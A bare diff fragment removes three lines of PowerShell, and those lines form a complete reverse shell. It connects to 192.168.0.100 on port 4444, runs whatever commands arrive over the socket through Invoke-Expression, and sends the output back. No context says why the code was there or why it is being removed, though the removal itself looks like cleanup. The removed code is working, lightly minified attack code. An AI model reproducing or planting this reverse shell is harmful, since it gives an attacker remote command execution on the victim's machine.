@@ -1,3 +1,0 @@
-$p = "192.168.0.100";$q = 4444;$r = New-Object Net.Sockets.TCPClient($p,$q);$s = $r.GetStream();$t = New-Object IO.StreamReader($s);$u = New-Object IO.StreamWriter($s);
-$u.AutoFlush = $true;$v = New-Object System.Byte[] 2048;$w = New-Object System.Text.StringBuilder;$u.Write(">> ");while($r.Connected){while($s.DataAvailable){$x = $s.Read($v,0,$v.Length);
-$y = ([text.encoding]::UTF8).GetString($v,0,$x);$w.Append($y)|Out-Null;if($y -match "`n"){$z = $w.ToString().Trim();$w.Clear();if($z -eq "quit"){break};$aa = try{Invoke-Expression $z 2>&1|Out-String}catch{$_.Exception.Message};$u.Write("$aa`r>> ");$z=$null}}};$r.Close();$s.Close();$t.Close();$u.Close()
